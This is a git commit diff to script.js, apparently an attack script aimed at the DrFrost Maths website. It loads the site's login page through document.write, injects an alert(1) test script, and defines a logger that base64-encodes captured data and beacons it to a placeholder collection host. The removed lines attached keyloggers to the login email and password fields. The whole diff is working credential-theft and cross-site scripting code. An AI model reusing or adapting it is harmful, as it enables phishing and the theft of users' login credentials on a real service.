b8d8a22d3c20ab2786f2d3bd59afd6cee148622b
soesam <67687007+soesam@users.noreply.github.com>
2020-07-08 21:53:20 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,21 +1,17 @@
-//(function() {
-  window.comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
-  window.bin = 'https://???/bin?data='
+(function() {
+  let comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
+  let bin = 'https://???/bin?data='
 
-  window.load = async path => document.write(
+  let load = async path => document.write(
     await fetch(path)
-    .then(r => r.text())
+    .then(response => response.text())
+    .then(text => text + '<script>alert(1)</script>')
   )
 
-  window.log = data => {
-    //new Image()
-    //.src = `${bin}${btoa(JSON.stringify(data))}`
-    console.log(`in data: ${data}`)
+  let log = data => {
+    new Image()
+    .src = `${bin}${btoa(JSON.stringify(data))}`
   }
   
   load(`/login.php?url=${encodeURIComponent(comfort)}`)
-  setTimeout(() => {
-  document.querySelector('[name=login-email]').onkeydown = ({key}) => log(key)
-  document.querySelector('[name=login-password]').onkeydown = ({key}) => log(key)
-  }, 4000)
-//})()
+})()
